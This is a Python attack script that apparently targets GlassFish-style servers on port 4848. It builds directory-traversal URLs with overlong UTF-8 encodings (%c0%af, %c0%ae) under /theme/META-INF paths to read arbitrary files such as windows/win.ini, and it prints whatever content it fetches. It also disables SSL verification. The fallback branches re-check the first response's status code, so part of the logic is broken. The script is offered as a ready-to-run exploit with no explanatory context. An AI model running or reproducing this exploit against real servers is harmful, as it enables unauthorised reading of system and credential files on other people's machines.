#!/usr/bin/python3

import requests
import os
import ssl
from colorama import Fore, Back, Style


if (not os.environ.get('PYTHONHTTPSVERIFY', '') and getattr(ssl, '_create_unverified_context', None)):
    ssl._create_default_https_context = ssl._create_unverified_context
print ("[*] Target URL format = https://www.mydomain.com:4848") 
host = input("[*] Enter target URL: ")
print ("[*] Target file format = windows/win.ini")
file = input("[*] Enter target file: ")
while True:

    
    pathnumber = int(input("Enter the number of dirs to add in the url (default is 12): "))
    # Initialize an empty string to hold the result
    result = ""
    result2 = ""
    text= "..%c0%af"
    text2= "%c0%ae%c0%ae/"
# Add the text to the result string 'number' times
    for _ in range(pathnumber):
        result += text
    for x in range(pathnumber):
        result2 += text2
        
    paths = [
        "/theme/META-INF/prototype%c0%af..%c0%af" + result,
        "/theme/META-INF/json%c0%af..%c0%af" + result,
        "/theme/META-INF/dojo%c0%af..%c0%af" + result,
        "/theme/META-INF%c0%af..%c0%af"+ result,
        "/theme/com/sun%c0%af..%c0%af"+ result,
        "/theme/com%c0%af..%c0%af"+ result,
        "/theme/META-INF/%c0%ae%c0%ae/" + result2,
        "/theme/META-INF/%c0%ae" + result2,
        
        ]
    for url in paths:
        combined = host + url + file
        response = requests.get(combined)
    
        if response.status_code == 200:
            print(f"Successfully fetched content from {combined}")
            print("Content:")
            print(Fore.RED + response.text[:100])
            print("-" * 50)
        else:
            combined2 = host + url + file.replace("/","%c0%af")
            response2 = requests.get(combined2)
            if response.status_code == 200:
                print(f"Successfully fetched content from {combined2}")
                print("Content:")
                print(Fore.RED + response.text[:100])
                print("-" * 50)
            else:
                combined3 = host + url + file.replace("/","%c0%ae")
                response2 = requests.get(combined3)
                if response.status_code == 200:
                    print(f"Successfully fetched content from {combined3}")
                    print("Content:")
                    print(Fore.RED + response.text[:100])
                    print("-" * 50)
            
            print(Fore.RESET + f"Failed to fetch content from {combined}. Status code: {response.status_code}")
       
